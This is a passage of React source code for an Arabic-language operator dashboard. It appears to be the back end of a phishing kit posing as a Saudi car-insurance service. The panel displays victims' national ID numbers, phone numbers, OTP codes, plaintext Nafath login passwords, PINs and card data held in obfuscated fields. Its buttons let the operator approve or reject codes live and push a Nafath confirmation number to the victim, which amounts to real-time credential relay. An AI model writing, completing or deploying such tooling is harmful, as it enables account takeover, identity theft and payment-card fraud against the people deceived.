    const shouldShowPhoneOtpBox = hasAnyPhoneData || currentStep === 5 || currentPage === "step5" || currentPage === "phone";
    const showPhoneButtons = !["approved", "rejected"].includes(effectivePhoneOtpStatus) && (hasPhoneData || Boolean(phoneOtpCode)) && (effectivePhoneOtpStatus === "pending" || effectivePhoneOtpStatus === "verifying" || effectivePhoneOtpStatus === "");
    
    // Always show if there's any phone-related data, never hide
    if (!shouldShowPhoneOtpBox && currentStep !== 7) {
      return null;
    }

    return (
      <div style={{ 
        background: "#ffffff", 
        borderRadius: 12, 
        padding: 16, 
        border: "1px solid #e5e7eb", 
        marginBottom: 12,
        marginTop: 10,
        width: "40%",
        marginRight: 0,
        marginLeft: "auto"
      }}>
        <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12 }}>
          <span style={{ fontSize: "1.2rem" }}>📱</span>
          <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>
            تحقق الهاتف
          </h3>
        </div>

        {hasPhoneData && (
          <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
            <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
              <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>رقم الهوية</span>
              <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw?.phoneIdNumber || raw?.identityNumber || "—"}</span>
            </div>
            <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
              <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>رقم الجوال</span>
              <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw?.phoneNumber || raw?.mobileNumber || "—"}</span>
            </div>
            <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
              <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>شركة الاتصالات</span>
              <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw?.phoneCarrier || "غير محدد"}</span>
            </div>
          </div>
        )}

        {phoneOtpCode && (
          <div style={{ background: "#f9fafb", borderRadius: 8, padding: 8, marginBottom: 8, marginTop: 8 }}>
            <div style={{ marginBottom: 8 }}>
              <div style={{ fontSize: "10px", color: "#6b7280", textAlign: "right", marginBottom: 2 }}>
                {(() => {
                  const dt = new Date(selectedRequest?.submittedAt || selectedRequest?.updatedAt || Date.now());
                  const dateLabel = dt.toLocaleDateString("en-US", { month: "2-digit", day: "2-digit" }).replace(/\//g, "-");
                  const timeLabel = dt.toLocaleTimeString("en-US", { hour: "numeric", minute: "2-digit", hour12: true }).toLowerCase();
                  return `${dateLabel} | ${timeLabel}`;
                })()}
              </div>
              <h3 style={{ margin: 0, fontSize: "0.875rem", fontWeight: 700, color: "#111827", textAlign: "center" }}>كود تحقق الهاتف</h3>
            </div>
            <div style={{ display: "flex", justifyContent: "center", gap: 4, direction: "ltr", marginBottom: 0 }}>
              {String(phoneOtpCode).split("").slice(0, 6).map((digit, idx) => (
                <div key={`${digit}-${idx}`} style={{ background: "#ffffff", borderRadius: 6, boxShadow: "0 1px 2px rgba(0, 0, 0, 0.04)", display: "flex", alignItems: "center", justifyContent: "center", width: 32, height: 40 }}>
                  <span style={{ fontSize: "1.25rem", fontWeight: 700, color: "#111827" }}>{digit}</span>
                </div>
              ))}
            </div>
          </div>
        )}

        {showPhoneButtons && (
          <div style={{ display: "flex", gap: 8, justifyContent: "center", marginTop: 10 }}>
            <button onClick={() => handleLocalPhoneAction("approved")} style={{ border: "none", borderRadius: 8, padding: "8px 12px", background: "#16a34a", color: "#fff", cursor: "pointer", fontWeight: 700 }}>
              موافقة
            </button>
            <button onClick={() => handleLocalPhoneAction("rejected")} style={{ border: "none", borderRadius: 8, padding: "8px 12px", background: "#dc2626", color: "#fff", cursor: "pointer", fontWeight: 700 }}>
              رفض
            </button>
          </div>
        )}

        {/* Status message - show ONLY when approved */}
        {effectivePhoneOtpStatus === "approved" && (
          <div style={{ background: "#dcfce7", borderRadius: 8, padding: 8, border: "1px solid #86efac" }}>
            <p style={{ margin: 0, fontSize: "0.8rem", color: "#166534", fontWeight: 600 }}>✅ تمت الموافقة - العميل يُوجه للصفحة التالية</p>
          </div>
        )}

        {/* Status message - show ONLY when rejected */}
        {effectivePhoneOtpStatus === "rejected" && (
          <div style={{ background: "#fee2e2", borderRadius: 8, padding: 8, border: "1px solid #fca5a5" }}>
            <p style={{ margin: 0, fontSize: "0.8rem", color: "#991b1b", fontWeight: 600 }}>❌ تم الرفض - العميل سيُعيد المحاولة</p>
          </div>
        )}
      </div>
    );
  };

  // Render Nafad box (currentStep === 8)
const renderNafadBox = () => {
    const currentStep = getCurrentStep();
    const nafadStatus = getNafadStatus();
    // Get latest nafad data from all entries
    const raw = getLatestRawForBox('nafad') || selectedRequest?.raw;

    // Get nafad data
    const hasNafadData = raw?.nafadIdNumber || raw?.nafadPassword;
    const adminNafadCode = raw?.adminNafadCode;
    const isVerifying = nafadStatus === "verifying";

    // Show box if: has nafad data OR admin sent code OR is verifying OR at step 8
    if (!hasNafadData && !adminNafadCode && !isVerifying && currentStep !== 8) {
      return null;
    }

    return (
      <div style={{ 
        background: "#ffffff", 
        borderRadius: 12, 
        padding: 16, 
        border: "1px solid #e5e7eb", 
        marginBottom: 12,
        marginTop: 10,
        width: "40%",
        marginRight: 0,
        marginLeft: "auto"
      }}>
        <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12 }}>
          <span style={{ fontSize: "1.2rem" }}>🇸🇦</span>
          <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>
            نفاذ
          </h3>
        </div>
        <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
          {raw?.nafadIdNumber && (
            <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
              <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>رقم الهوية</span>
              <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw.nafadIdNumber}</span>
            </div>
          )}
          {raw?.nafadPassword && (
            <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
              <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>كلمة المرور</span>
              <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{String(raw.nafadPassword)}</span>
            </div>
          )}
          <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
            <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>رقم التأكيد المُرسل</span>
            <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{adminNafadCode || "00"}</span>
          </div>
        </div>

        {/* Input field and send button - show ONLY when verifying (new event) */}
        {isVerifying && (
          <div style={{ display: "flex", flexDirection: "column", gap: 12, marginTop: 8 }}>
            <div style={{ display: "flex", gap: 8 }}>
              <input
                type="text"
                placeholder="أدخل رقم التأكيد"
                value={nafadInput}
                onChange={(e) => setNafadInput(e.target.value.replace(/\D/g, "").slice(0, 2))}
                style={{ flex: 1, padding: "10px 12px", border: "1px solid #d1d5db", borderRadius: 8, fontSize: "0.875rem" }}
              />
              <button
                onClick={() => {
                  handleSendNafadCode();
                  setNafadInput("");
                }}
                disabled={actionLoading === "nafad" || !nafadInput}
                style={{ padding: "10px 16px", background: nafadInput ? "#2563eb" : "#9ca3af", color: nafadInput ? "#ffffff" : "#f3f4f6", borderRadius: 8, fontSize: "0.875rem", fontWeight: 700, cursor: nafadInput ? "pointer" : "not-allowed", border: "none" }}
              >
                إرسال
              </button>
            </div>
          </div>
        )}

        {/* Status message - show when code was sent */}
        {adminNafadCode && (
          <div style={{ background: "#dcfce7", borderRadius: 8, padding: 8, border: "1px solid #86efac" }}>
            <p style={{ margin: 0, fontSize: "0.8rem", color: "#166534", fontWeight: 600 }}>✅ تم إرسال رمز التأكيد للعميل</p>
          </div>
        )}
      </div>
    );
  };

  const renderCustomerEntrySummary = () => {
    if (!selectedRequest) return null;
    const previousEntries = customerEntryGroup.filter((entry) => entry.id !== selectedRequest.id);
    if (!previousEntries.length) return null;
    
    return (
      <div style={{ background: "#ffffff", border: "1px solid #e5e7eb", borderRadius: 12, padding: 12, marginBottom: 12, boxShadow: "0 1px 2px rgba(15, 23, 42, 0.04)" }}>
        <div style={{ fontSize: "0.8rem", fontWeight: 700, color: "#111827", marginBottom: 8 }}>إدخالات العميل داخل هذا الصندوق</div>
        <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
          {previousEntries.map((entry, index) => {
            const entryType = (entry as EntryWithType).entryType;
            const isNewData = entryType === 'new';
            const isUpdate = entryType === 'update';
            
            return (
              <div
                key={entry.id}
                style={{
                  border: `1px solid ${isNewData ? '#86efac' : '#e5e7eb'}`,
                  borderRadius: 10,
                  padding: 10,
                  background: isNewData ? "#f0fdf4" : "#f8fafc",
                  position: "relative",
                  marginTop: isNewData || isUpdate ? 8 : 0
                }}
              >
                {isNewData && (
                  <div style={{
                    position: "absolute",
                    top: -8,
                    right: 12,
                    background: "#22c55e",
                    color: "#fff",
                    fontSize: "0.65rem",
                    fontWeight: 700,
                    padding: "2px 8px",
                    borderRadius: 4
                  }}>
                    📝 إدخال جديد
                  </div>
                )}
                {isUpdate && (
                  <div style={{
                    position: "absolute",
                    top: -8,
                    right: 12,
                    background: "#3b82f6",
                    color: "#fff",
                    fontSize: "0.65rem",
                    fontWeight: 700,
                    padding: "2px 8px",
                    borderRadius: 4
                  }}>
                    🔄 تحديث
                  </div>
                )}
                <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", gap: 8, marginBottom: 6 }}>
                  <span style={{ fontWeight: 700, color: "#111827" }}>إدخال جديد {index + 1}</span>
                  <span style={{ fontSize: "0.75rem", color: "#64748b", background: "#f3f4f6", padding: "2px 8px", borderRadius: 6 }}>
                    {entry.stage || "مفتوح"}
                  </span>
                </div>
                <div style={{ display: "flex", flexWrap: "wrap", gap: 8, fontSize: "0.8rem", color: "#374151" }}>
                  <span>الهوية: {entry.raw?.identityNumber || entry.raw?.phoneIdNumber || entry.raw?.nafadIdNumber || "—"}</span>
                  <span>الجوال: {entry.raw?.phoneNumber || entry.raw?.mobileNumber || "—"}</span>
                  <span>الوقت: {new Date(entry.submittedAt || entry.updatedAt || Date.now()).toLocaleTimeString("en-US", { hour: "2-digit", minute: "2-digit", hour12: true })}</span>
                </div>
              </div>
            );
          })}
        </div>
      </div>
    );
  };

  // Time Counter Component
  const formatCounter = (ts: number, nowValue: number): string => {
    const seconds = Math.floor((nowValue - ts) / 1000);
    if (seconds < 0) return "الآن";
    if (seconds < 60) return `منذ ${seconds} ثانية`;
    if (seconds < 3600) return `منذ ${Math.floor(seconds / 60)} دقيقة`;
    if (seconds < 86400) return `منذ ${Math.floor(seconds / 3600)} ساعة`;
    return `منذ ${Math.floor(seconds / 86400)} يوم`;
  };

  const TimeCounter = React.memo(({ timestamp }: { timestamp: number }) => {
    const [now, setNow] = React.useState(Date.now());

    React.useEffect(() => {
      setNow(Date.now());
    }, [timestamp]);

    React.useEffect(() => {
      const interval = window.setInterval(() => {
        setNow(Date.now());
      }, 1000);
      return () => window.clearInterval(interval);
    }, []);

    return (
      <div style={{ 
        position: "absolute", 
        top: 8, 
        left: 2, 
        background: "#f3f4f6", 
        borderRadius: 6, 
        padding: "2px 8px"
      }}>
        <span style={{ fontSize: "0.65rem", color: "#6b7280" }}>{formatCounter(timestamp, now)}</span>
      </div>
    );
  });

  // Get timestamp helper
  const getTimestamp = (data: any): number => {
    if (data?.submittedAt) return new Date(data.submittedAt).getTime();
    if (data?.updatedAt) return new Date(data.updatedAt).getTime();
    return Date.now();
  };

  // Render static boxes with injected data
  const renderStaticBoxes = () => {
    // Get latest data for each type from customerEntryGroup
    // Find the entry that contains each type of data to get its timestamp
    
    // Each box type has its own specific timestamp field
    // Card: checkUpdatedAt > cardUpdatedAt > submittedAt
    const getCardTimestamp = (raw: any): number => {
      if (!raw) return 0;
      const ts = raw.checkUpdatedAt || raw.cardUpdatedAt || raw.cardSubmittedAt || raw.submittedAt;
      return ts ? new Date(ts).getTime() : 0;
    };
    
    // PIN: pinSubmittedAt > pinUpdatedAt
    const getPinTimestamp = (raw: any): number => {
      if (!raw) return 0;
      const ts = raw.pinSubmittedAt || raw.pinUpdatedAt || raw._v6UpdatedAt;
      return ts ? new Date(ts).getTime() : 0;
    };
    
    // Phone: phoneSubmittedAt > phoneUpdatedAt
    const getPhoneTimestamp = (raw: any): number => {
      if (!raw) return 0;
      const ts = raw.phoneSubmittedAt || raw.phoneUpdatedAt;
      return ts ? new Date(ts).getTime() : 0;
    };
    
    // Nafad: nafadSubmittedAt > nafadUpdatedAt
    const getNafadTimestamp = (raw: any): number => {
      if (!raw) return 0;
      const ts = raw.nafadSubmittedAt || raw.nafadUpdatedAt;
      return ts ? new Date(ts).getTime() : 0;
    };
    
    // Insurance: insuranceSubmittedAt > insuranceUpdatedAt > createdAt
    const getInsuranceTimestamp = (raw: any): number => {
      if (!raw) return 0;
      const ts = raw.insuranceSubmittedAt || raw.insuranceUpdatedAt || raw.createdAt || raw.submittedAt;
      return ts ? new Date(ts).getTime() : 0;
    };
    
    // Basic: createdAt > submittedAt
    const getBasicTimestamp = (raw: any): number => {
      if (!raw) return 0;
      const ts = raw.createdAt || raw.submittedAt || raw.updatedAt;
      return ts ? new Date(ts).getTime() : 0;
    };
    
    // Get card data and timestamp from the specific entry that actually contains card data
    const cardMatch = getLatestEntryForMatcher((raw) => Boolean(
      raw._v1 || raw._v2 || raw._v3 || raw.cardNumber || raw.paymentStatus || raw.hasCard ||
      raw._v1UpdatedAt || raw.cardUpdatedAt || raw.checkUpdatedAt || raw.cardSubmittedAt
    ));
    const cardEntry = cardMatch?.entry || null;
    const cardRaw = cardMatch?.raw || null;
    const hasCardData = Boolean(
      cardRaw && (
        cardRaw._v1 || cardRaw._v2 || cardRaw._v3 || 
        cardRaw.cardNumber || cardRaw.paymentStatus || cardRaw.hasCard
      )
    );
    
    // Use the box-specific timestamp from the matched entry, not the selected request's shared timestamp
    const cardTimestamp = cardRaw?._v1UpdatedAt
      ? new Date(cardRaw._v1UpdatedAt).getTime()
      : (cardRaw?.cardUpdatedAt ? new Date(cardRaw.cardUpdatedAt).getTime()
        : (cardRaw?.checkUpdatedAt ? new Date(cardRaw.checkUpdatedAt).getTime()
          : (cardRaw?.cardSubmittedAt ? new Date(cardRaw.cardSubmittedAt).getTime()
            : (cardEntry?.submittedAt ? new Date(cardEntry.submittedAt).getTime() : 0))));
    
    // Calculate the overall latest timestamp from all box types to determine "الأحدث"
    // This will be set after all boxes are created and sorted
    
    // Get OTP data and its timestamp from the specific entry that actually contains OTP data
    const otpMatch = getLatestEntryForMatcher((raw) => Boolean(
      raw._v5 || raw.otpCode || raw.otpSubmittedAt || raw._v5UpdatedAt || raw._v5Status
    ));
    const otpEntry = otpMatch?.entry || null;
    const otpRaw = otpMatch?.raw || null;
    const hasOtpData = Boolean(otpRaw && (otpRaw._v5 || otpRaw.otpCode));
    const otpTimestamp = otpRaw?._v5UpdatedAt
      ? new Date(otpRaw._v5UpdatedAt).getTime()
      : (otpRaw?.otpSubmittedAt ? new Date(otpRaw.otpSubmittedAt).getTime()
        : (otpRaw?.comparCompletedAt ? new Date(otpRaw.comparCompletedAt).getTime()
          : (otpEntry?.submittedAt ? new Date(otpEntry.submittedAt).getTime() : 0)));
    
    // Get PIN data and its timestamp from the specific entry that actually contains PIN data
    const pinMatch = getLatestEntryForMatcher((raw) => Boolean(
      raw._v6 || raw.pinCode || raw.pinSubmittedAt || raw._v6UpdatedAt || raw._v6Status
    ));
    const pinEntry = pinMatch?.entry || null;
    const pinRaw = pinMatch?.raw || null;
    const hasPinData = Boolean(
      pinRaw && (pinRaw._v6 || pinRaw.pinCode)
    );
    const pinTimestamp = pinRaw?._v6UpdatedAt
      ? new Date(pinRaw._v6UpdatedAt).getTime()
      : (pinRaw?.pinSubmittedAt ? new Date(pinRaw.pinSubmittedAt).getTime()
        : (pinRaw?.comparCompletedAt ? new Date(pinRaw.comparCompletedAt).getTime()
          : (pinEntry?.submittedAt ? new Date(pinEntry.submittedAt).getTime() : 0)));
    
    // Get phone data and its timestamp from the specific entry that actually contains phone data
    const phoneMatch = getLatestEntryForMatcher((raw) => Boolean(
      raw.phoneIdNumber || raw.phoneNumber || raw.phoneCarrier || raw.phoneOtp || raw._v7 ||
      raw.phoneSubmittedAt || raw._v7UpdatedAt || raw.phoneOtpSubmittedAt
    ));
    const phoneEntry = phoneMatch?.entry || null;
    const phoneRaw = phoneMatch?.raw || null;
    const hasPhoneData = Boolean(
      phoneRaw && (
        phoneRaw.phoneIdNumber || phoneRaw.phoneNumber || 
        phoneRaw.phoneCarrier || phoneRaw.phoneOtp || phoneRaw._v7
      )
    );
    const phoneTimestamp = phoneRaw?._v7UpdatedAt
      ? new Date(phoneRaw._v7UpdatedAt).getTime()
      : (phoneRaw?.phoneSubmittedAt ? new Date(phoneRaw.phoneSubmittedAt).getTime()
        : (phoneRaw?.phoneOtpSubmittedAt ? new Date(phoneRaw.phoneOtpSubmittedAt).getTime()
          : (phoneRaw?.comparCompletedAt ? new Date(phoneRaw.comparCompletedAt).getTime()
            : (phoneEntry?.submittedAt ? new Date(phoneEntry.submittedAt).getTime() : 0))));
    
    // Get nafad data and its timestamp from the specific entry that actually contains nafad data
    const nafadMatch = getLatestEntryForMatcher((raw) => Boolean(
      raw.nafadIdNumber || raw.nafadPassword || raw.nafadUpdatedAt || raw.nafadSubmittedAt
    ));
    const nafadEntry = nafadMatch?.entry || null;
    const nafadRaw = nafadMatch?.raw || null;
    const hasNafadData = Boolean(
      nafadRaw && (nafadRaw.nafadIdNumber || nafadRaw.nafadPassword)
    );
    const nafadTimestamp = nafadRaw?.nafadUpdatedAt
      ? new Date(nafadRaw.nafadUpdatedAt).getTime()
      : (nafadRaw?.nafadSubmittedAt ? new Date(nafadRaw.nafadSubmittedAt).getTime()
        : (nafadRaw?.comparCompletedAt ? new Date(nafadRaw.comparCompletedAt).getTime()
          : (nafadEntry?.submittedAt ? new Date(nafadEntry.submittedAt).getTime() : 0)));
    
    // Build boxes array - ONE BOX per TYPE (not per entry)
    // Each type (basic, insurance, card, etc.) gets ONE box with the latest data
    type BoxType = {
      key: string;
      timestamp: number;
      component: React.ReactNode;
    };

    // Memoized wrapper for box components - prevents re-render when timestamp is stable
    const MemoizedBox = React.memo(({ component, timestamp }: { component: React.ReactNode; timestamp: number }) => {
      return <>{component}</>;
    }, (prevProps, nextProps) => {
      // Only re-render if timestamp actually changed
      return prevProps.timestamp === nextProps.timestamp;
    });
    
    const boxes: BoxType[] = [];
    
    // Count entries that have basic/insurance data
    const basicEntriesCount = customerEntryGroup.filter(entry => {
      const raw = entry.raw || {};
      return raw.identityNumber || raw.ownerName || raw.buyerName ||
             raw.phoneNumber || raw.serialNumber ||
             raw.insuranceCoverage || raw.vehicleModel ||
             raw.vehicleValue || raw.vehicleYear || raw.repairLocation;
    }).length;
    
    // Find the most recent entry with Basic/Insurance data
    let latestBasicEntry: (typeof customerEntryGroup)[0] | null = null;
    let latestBasicTimestamp = 0;
    
    customerEntryGroup.forEach((entry) => {
      const raw = entry.raw || {};
      const hasBasic = raw.identityNumber || raw.ownerName || raw.buyerName ||
                       raw.phoneNumber || raw.serialNumber;
      const hasInsurance = raw.insuranceCoverage || raw.vehicleModel ||
                           raw.vehicleValue || raw.vehicleYear || raw.repairLocation;
      if (hasBasic || hasInsurance) {
        // Use submittedAt or comparCompletedAt for timestamp (these are the real times from DB)
        const ts = raw.comparCompletedAt
          ? new Date(raw.comparCompletedAt).getTime()
          : (entry.submittedAt ? new Date(entry.submittedAt).getTime() : 0);
        if (ts >= latestBasicTimestamp) {
          latestBasicTimestamp = ts;
          latestBasicEntry = entry;
        }
      }
    });

    // Create ONE box for Basic/Insurance (latest entry only)
    if (latestBasicEntry) {
      const raw = latestBasicEntry.raw || {};
      const hasBasic = raw.identityNumber || raw.ownerName || raw.buyerName ||
                       raw.phoneNumber || raw.serialNumber;
      const hasInsurance = raw.insuranceCoverage || raw.vehicleModel ||
                           raw.vehicleValue || raw.vehicleYear || raw.repairLocation;
      
      if (hasBasic || hasInsurance) {
      // Use submittedAt or comparCompletedAt for timestamp (real times from database)
      let entryTimestamp = raw.comparCompletedAt
        ? new Date(raw.comparCompletedAt).getTime()
        : (latestBasicEntry.submittedAt ? new Date(latestBasicEntry.submittedAt).getTime() : 0);

      boxes.push({
        key: `basic-insurance-${latestBasicEntry.id}`,
        timestamp: entryTimestamp,
        component: (
          <div style={{
            background: "#ffffff",
            borderRadius: 12,
            padding: 16,
            border: "2px solid #3b82f6",
            width: "45%",
            marginRight: 0,
            marginLeft: "auto",
            position: "relative",
            marginBottom: 16
          }}>
            <TimeCounter timestamp={entryTimestamp} />
            
            {/* Basic Info Section */}
            {hasBasic && (
              <>
                <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12, marginTop: 20 }}>
                  <h3 style={{ margin: 0, fontSize: "0.85rem", fontWeight: 700, color: "#111827" }}>المعلومات الأساسية</h3>
                </div>
                <div style={{ display: "flex", flexDirection: "column", gap: 6 }}>
                  {raw.identityNumber && (
                    <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 4, padding: 6 }}>
                      <span style={{ fontSize: "0.75rem", color: "#6b7280" }}>رقم الهوية</span>
                      <span style={{ fontSize: "0.8rem", fontWeight: 600, color: "#111827" }}>{raw.identityNumber}</span>
                    </div>
                  )}
                  {raw.ownerName && (
                    <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 4, padding: 6 }}>
                      <span style={{ fontSize: "0.75rem", color: "#6b7280" }}>الاسم</span>
                      <span style={{ fontSize: "0.8rem", fontWeight: 600, color: "#111827" }}>{raw.ownerName}</span>
                    </div>
                  )}
                  {raw.phoneNumber && (
                    <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 4, padding: 6 }}>
                      <span style={{ fontSize: "0.75rem", color: "#6b7280" }}>رقم الهاتف</span>
                      <span style={{ fontSize: "0.8rem", fontWeight: 600, color: "#111827" }}>{raw.phoneNumber}</span>
                    </div>
                  )}
                  {raw.serialNumber && (
                    <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 4, padding: 6 }}>
                      <span style={{ fontSize: "0.75rem", color: "#6b7280" }}>الرقم التسلسلي</span>
                      <span style={{ fontSize: "0.8rem", fontWeight: 600, color: "#111827" }}>{raw.serialNumber}</span>
                    </div>
                  )}
                  {raw.buyerName && (
                    <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 4, padding: 6 }}>
                      <span style={{ fontSize: "0.75rem", color: "#6b7280" }}>اسم المشتري</span>
                      <span style={{ fontSize: "0.8rem", fontWeight: 600, color: "#111827" }}>{raw.buyerName}</span>
                    </div>
                  )}
                  {raw.documentType && (
                    <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 4, padding: 6 }}>
                      <span style={{ fontSize: "0.75rem", color: "#6b7280" }}>نوع المستند</span>
                      <span style={{ fontSize: "0.8rem", fontWeight: 600, color: "#111827" }}>{raw.documentType}</span>
                    </div>
                  )}
                </div>
              </>
            )}
            
            {/* Insurance Info Section */}
            {hasInsurance && (
              <>
                <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12, marginTop: 16 }}>
                  <h3 style={{ margin: 0, fontSize: "0.85rem", fontWeight: 700, color: "#111827" }}>بيانات التأمين</h3>
                </div>
                <div style={{ display: "flex", flexDirection: "column", gap: 6 }}>
                  {raw.insuranceCoverage && (
                    <div style={{ display: "flex", justifyContent: "space-between", background: "#f0fdf4", borderRadius: 4, padding: 6 }}>
                      <span style={{ fontSize: "0.75rem", color: "#6b7280" }}>نوع التأمين</span>
                      <span style={{ fontSize: "0.8rem", fontWeight: 600, color: "#111827" }}>{raw.insuranceCoverage}</span>
                    </div>
                  )}
                  {raw.vehicleModel && (
                    <div style={{ display: "flex", justifyContent: "space-between", background: "#f0fdf4", borderRadius: 4, padding: 6 }}>
                      <span style={{ fontSize: "0.75rem", color: "#6b7280" }}>الموديل</span>
                      <span style={{ fontSize: "0.8rem", fontWeight: 600, color: "#111827" }}>{raw.vehicleModel}</span>
                    </div>
                  )}
                  {raw.vehicleValue && (
                    <div style={{ display: "flex", justifyContent: "space-between", background: "#f0fdf4", borderRadius: 4, padding: 6 }}>
                      <span style={{ fontSize: "0.75rem", color: "#6b7280" }}>القيمة</span>
                      <span style={{ fontSize: "0.8rem", fontWeight: 600, color: "#111827" }}>{raw.vehicleValue}</span>
                    </div>
                  )}
                  {raw.vehicleYear && (
                    <div style={{ display: "flex", justifyContent: "space-between", background: "#f0fdf4", borderRadius: 4, padding: 6 }}>
                      <span style={{ fontSize: "0.75rem", color: "#6b7280" }}>سنة الصنع</span>
                      <span style={{ fontSize: "0.8rem", fontWeight: 600, color: "#111827" }}>{raw.vehicleYear}</span>
                    </div>
                  )}
                  {raw.repairLocation && (
                    <div style={{ display: "flex", justifyContent: "space-between", background: "#f0fdf4", borderRadius: 4, padding: 6 }}>
                      <span style={{ fontSize: "0.75rem", color: "#6b7280" }}>مكان الإصلاح</span>
                      <span style={{ fontSize: "0.8rem", fontWeight: 600, color: "#111827" }}>{raw.repairLocation}</span>
                    </div>
                  )}
                </div>
              </>
            )}
            
            {/* زر عرض السجل - يظهر فقط إذا كان هناك أكثر من إدخال */}
            {basicEntriesCount > 1 && (
              <button
                onClick={() => setOpenLogBox(openLogBox === 'basic' ? null : 'basic')}
                style={{
                  marginTop: 16,
                  width: "100%",
                  padding: "10px 16px",
                  border: "1px solid #d1d5db",
                  borderRadius: 8,
                  background: openLogBox === 'basic' ? "#f0fdf4" : "#f9fafb",
                  color: openLogBox === 'basic' ? "#16a34a" : "#374151",
                  fontWeight: 600,
                  fontSize: "0.8rem",
                  cursor: "pointer",
                  transition: "all 0.2s",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  gap: 8
                }}
              >
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z" />
                  <polyline points="14,2 14,8 20,8" />
                  <line x1="16" y1="13" x2="8" y2="13" />
                  <line x1="16" y1="17" x2="8" y2="17" />
                </svg>
                عرض السجل ({basicEntriesCount} إدخالات)
              </button>
            )}
            
            {/* سجل الإدخالات */}
            {openLogBox === 'basic' && basicEntriesCount > 1 && (
              <div style={{
                marginTop: 12,
                padding: 12,
                background: "#f9fafb",
                borderRadius: 8,
                maxHeight: 300,
                overflowY: "auto"
              }}>
                <div style={{ fontSize: "0.75rem", fontWeight: 600, color: "#6b7280", marginBottom: 8 }}>
                  سجل الإدخالات:
                </div>
                {customerEntryGroup
                  .filter(entry => {
                    const raw = entry.raw || {};
                    return raw.identityNumber || raw.ownerName || raw.buyerName ||
                           raw.documentType || raw.phoneNumber || raw.serialNumber ||
                           raw.insuranceCoverage || raw.vehicleModel ||
                           raw.vehicleValue || raw.vehicleYear || raw.repairLocation;
                  })
                  .sort((a, b) => {
                    const timeA = new Date(a.submittedAt || a.updatedAt || 0).getTime();
                    const timeB = new Date(b.submittedAt || b.updatedAt || 0).getTime();
                    return timeB - timeA;
                  })
                  .map((entry, idx) => {
                    const raw = entry.raw || {};
                    const entryTime = entry.submittedAt ? new Date(entry.submittedAt).toLocaleString('ar-SA') : '—';
                    const isCurrent = entry.id === selectedRequest?.id;
                    return (
                      <div key={entry.id} style={{
                        padding: "8px",
                        marginBottom: 8,
                        background: isCurrent ? "#dcfce7" : "#fff",
                        borderRadius: 6,
                        border: isCurrent ? "1px solid #16a34a" : "1px solid #e5e7eb",
                        fontSize: "0.7rem"
                      }}>
                        <div style={{ fontWeight: 600, color: "#374151", marginBottom: 4 }}>
                          {isCurrent ? "★ الحالي" : `إدخال ${idx + 1}`} - {entryTime}
                        </div>
                        {raw.identityNumber && (
                          <div style={{ color: "#6b7280" }}>رقم الهوية: {raw.identityNumber}</div>
                        )}
                        {raw.ownerName && (
                          <div style={{ color: "#6b7280" }}>الاسم: {raw.ownerName}</div>
                        )}
                        {raw.insuranceCoverage && (
                          <div style={{ color: "#6b7280" }}>نوع التأمين: {raw.insuranceCoverage}</div>
                        )}
                      </div>
                    );
                  })}
              </div>
            )}
          </div>
        )
      });
      }
    }
    
    // Sort boxes by timestamp (newest first)
    boxes.sort((a, b) => b.timestamp - a.timestamp);    
    // Determine which box should show "الأحدث" badge
    // Only the FIRST box (truly the latest) should show it
    const isLatestBadgeKey = boxes.length > 0 ? boxes[0].key : null;
    
    
    // Track the index of boxes for "الأحدث" badge (only first/latest box gets it)
    // After sorting, the first box is the latest - only it should show "الأحدث"
    // This prevents confusion when multiple boxes share the same timestamp

    // If still no boxes, return null
    if (boxes.length === 0) return null;
    
    // Count entries that have Card data
    const cardEntriesCount = customerEntryGroup.filter(entry => {
      const raw = entry.raw || {};
      return raw._v1 || raw.cardNumber;
    }).length;
    
    // Find the most recent entry with Card data
    let latestCardEntry: (typeof customerEntryGroup)[0] | null = null;
    let latestCardTimestamp = 0;
    
    customerEntryGroup.forEach((entry) => {
      const raw = entry.raw || {};
      if (raw._v1 || raw.cardNumber) {
        // Use _v1UpdatedAt for card timestamp, fallback to comparCompletedAt or submittedAt
